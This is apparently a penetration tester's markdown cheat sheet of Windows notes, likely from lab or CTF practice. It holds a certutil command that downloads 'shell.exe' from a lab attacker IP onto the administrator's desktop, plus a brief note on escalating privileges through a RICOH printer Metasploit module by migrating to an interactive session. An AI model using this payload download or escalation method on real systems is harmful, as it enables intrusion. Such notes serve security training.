# Windows

## Useful commands

- download a file, like wget in linux

  - `certutil -urlcache -f http://10.10.14.4/shell.exe c:\users\administrator\desktop\sh.exe`

  - in powershell:
    - ``

## Windows tools

- [WinSCP](https://winscp.net/eng/index.php) - Copy file between a local computer and remote servers using FTP, FTPS, SCP, SFTP, WebDAV or S3 file transfer protocols

## Windows privesc

- RICOH printer (msf module, if we are on process with session 0 (ps list), that service is non-interactive, so we migrate to interactive (session 1) process)

